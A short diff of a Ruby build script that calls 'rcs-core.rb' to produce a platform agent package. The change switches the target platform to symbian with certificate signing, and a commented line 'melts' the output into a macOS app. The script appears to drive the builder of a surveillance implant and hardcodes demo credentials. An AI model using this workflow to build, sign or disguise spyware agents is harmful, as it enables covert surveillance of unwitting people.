@@ -5,7 +5,7 @@ require 'json'
 USER = 'alor'
 PASS = 'demorcss'
 FACTORY = 'RCS_0000000001'
-PLATFORM = 'android'
+PLATFORM = 'symbian'
 
 ###################################################################################################
 begin
@@ -16,8 +16,8 @@ begin
             }
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
-system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o #{PLATFORM}.zip" or raise("Failed")
-#system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -C symbian.cer -o #{PLATFORM}.zip" or raise("Failed")
+#system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o #{PLATFORM}.zip" or raise("Failed")
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -C symbian.cer -o #{PLATFORM}.zip" or raise("Failed")
 #system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -i macos_app.zip -o osx_melted.zip" or raise("Failed")
 end
 ###################################################################################################
